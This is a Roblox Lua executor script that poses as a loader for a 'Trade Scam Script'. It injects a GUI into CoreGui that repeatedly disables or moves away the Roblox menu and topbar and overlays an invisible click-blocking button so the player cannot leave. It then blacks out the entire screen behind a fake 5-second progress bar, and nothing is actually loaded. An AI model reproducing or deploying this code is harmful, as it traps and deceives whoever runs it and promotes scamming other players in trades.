-- INCLUDED CODE START
pcall(function()
	if game.CoreGui:FindFirstChild("AntiLeaveBlocker") then
		game.CoreGui.AntiLeaveBlocker:Destroy()
	end
end)


local BLOCK_SIZE_X = 56
local BLOCK_SIZE_Y = 56
local BLOCK_POS_X  = 6
local BLOCK_POS_Y  = 6
local DISPLAY_ORDER = 10000


local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")


local function tryHideRobloxMenu()
	pcall(function()
		local names = {"RobloxGui", "RobloxMenu", "Menu", "MenuGui", "Topbar", "TopBar"}
		for _, n in ipairs(names) do
			local g = CoreGui:FindFirstChild(n)
			if g then
				pcall(function()
					if g:IsA("ScreenGui") then
						g.Enabled = false
						for _, c in ipairs(g:GetChildren()) do
							pcall(function() c.Visible = false end)
							pcall(function() c.Enabled = false end)
						end
					else
						for _, c in ipairs(g:GetDescendants()) do
							pcall(function()
								if c:IsA("GuiObject") then
									c.Position = UDim2.new(-10,0,-10,0)
								end
							end)
						end
					end
				end)
			end
		end
	end)
end


local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AntiLeaveBlocker"
screenGui.Parent = CoreGui
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = DISPLAY_ORDER
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local container = Instance.new("Frame")
container.Size = UDim2.new(0, BLOCK_SIZE_X, 0, BLOCK_SIZE_Y)
container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
container.BackgroundTransparency = 1
container.BorderSizePixel = 0
container.Parent = screenGui

local blocker = Instance.new("TextButton")
blocker.Size = UDim2.new(1, 0, 1, 0)
blocker.BackgroundTransparency = 1
blocker.AutoButtonColor = false
blocker.Text = ""
blocker.Parent = container
blocker.Active = true
blocker.Selectable = false

blocker.MouseButton1Down:Connect(function() end)
blocker.MouseButton1Up:Connect(function() end)
blocker.MouseButton2Down:Connect(function() end)
blocker.MouseButton2Up:Connect(function() end)


RunService.RenderStepped:Connect(function()
	container.Position = UDim2.new(0, BLOCK_POS_X, 0, BLOCK_POS_Y)
end)


spawn(function()
	while screenGui.Parent and screenGui.Parent == CoreGui do
		tryHideRobloxMenu()
		wait(2)
	end
end)
-- INCLUDED CODE END


-- ADDITION 1: FULL BLACK POV LAYER
local blackLayer = Instance.new("Frame")
blackLayer.Name = "BlackPOVLayer"
blackLayer.Size = UDim2.new(1, 0, 1, 0)
blackLayer.Position = UDim2.new(0, 0, 0, 0)
blackLayer.BackgroundColor3 = Color3.new(0, 0, 0)
blackLayer.BackgroundTransparency = 0
blackLayer.BorderSizePixel = 0
blackLayer.ZIndex = 10001
blackLayer.Parent = screenGui


-- ADDITION 2: LOADING TEXT
local loadingText = Instance.new("TextLabel")
loadingText.Name = "LoadingText"
loadingText.Size = UDim2.new(0, 500, 0, 60)
loadingText.Position = UDim2.new(0.5, -250, 0.5, -70) -- Above loading bar
loadingText.BackgroundTransparency = 1
loadingText.Text = "Loading Trade Scam Script..."
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.TextScaled = true
loadingText.TextWrapped = true
loadingText.ZIndex = 10002
loadingText.Parent = screenGui


-- ADDITION 3: FUNCTIONAL LOADING BAR (1-100%)
local barContainer = Instance.new("Frame")
barContainer.Name = "BarContainer"
barContainer.Size = UDim2.new(0, 400, 0, 30)
barContainer.Position = UDim2.new(0.5, -200, 0.5, 10) -- Centered below text
barContainer.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2) -- Dark gray background
barContainer.BorderSizePixel = 2
barContainer.BorderColor3 = Color3.new(0.5, 0.5, 0.5) -- Light gray border
barContainer.ZIndex = 10002
barContainer.Parent = screenGui

local progressBar = Instance.new("Frame")
progressBar.Name = "ProgressBar"
progressBar.Size = UDim2.new(0, 0, 1, 0) -- Starts at 0%
progressBar.Position = UDim2.new(0, 0, 0, 0)
progressBar.BackgroundColor3 = Color3.new(0, 0.8, 0) -- Green progress color
progressBar.BorderSizePixel = 0
progressBar.ZIndex = 10003
progressBar.Parent = barContainer

local percentageText = Instance.new("TextLabel")
percentageText.Name = "PercentageText"
percentageText.Size = UDim2.new(1, 0, 1, 0)
percentageText.Position = UDim2.new(0, 0, 0, 0)
percentageText.BackgroundTransparency = 1
percentageText.Text = "0%"
percentageText.TextColor3 = Color3.new(1, 1, 1)
percentageText.TextScaled = true
percentageText.ZIndex = 10004
percentageText.Parent = barContainer


-- ADDITION 4: CODE TO ANIMATE LOADING BAR (1-100% over 5 seconds)
spawn(function()
	local totalTime = 5 -- Time to reach 100% (in seconds)
	local updateInterval = 0.05 -- How often to update progress
	local steps = totalTime / updateInterval
	local currentPercent = 0

	for i = 1, steps do
		if not screenGui.Parent then break end -- Stop if GUI is deleted
		currentPercent = math.floor((i / steps) * 100) -- Calculate 1-100%
		progressBar.Size = UDim2.new(currentPercent / 100, 0, 1, 0) -- Update bar size
		percentageText.Text = currentPercent .. "%" -- Update percentage text
		wait(updateInterval)
	end

	-- Optional: Change text once loading is done
	if screenGui.Parent then
		loadingText.Text = "Loading Complete..."
		wait(2)
		-- Optional: Destroy GUI after completion (uncomment below)
		-- screenGui:Destroy()
	end
end)
